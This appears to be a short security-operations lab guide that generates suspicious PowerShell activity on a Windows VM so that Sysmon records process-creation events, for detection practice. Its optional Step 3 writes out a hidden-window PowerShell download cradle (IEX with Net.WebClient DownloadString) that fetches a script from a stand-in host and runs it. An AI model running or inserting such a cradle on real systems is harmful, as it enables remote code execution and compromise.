# Attack Steps

## Step 1

Open Command Prompt on the Windows VM.

## Step 2

Execute the following PowerShell command:

```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Write-Output 'SOC Lab Test'"
```

This simulates suspicious PowerShell execution using the `ExecutionPolicy Bypass` parameter.

## Step 3

(Optional) Generate a more suspicious event:

```powershell
powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://example.com/test.ps1')"
```

> Use only in your isolated lab environment.

## Step 4

Verify that Sysmon generated Event ID 1 (Process Create).
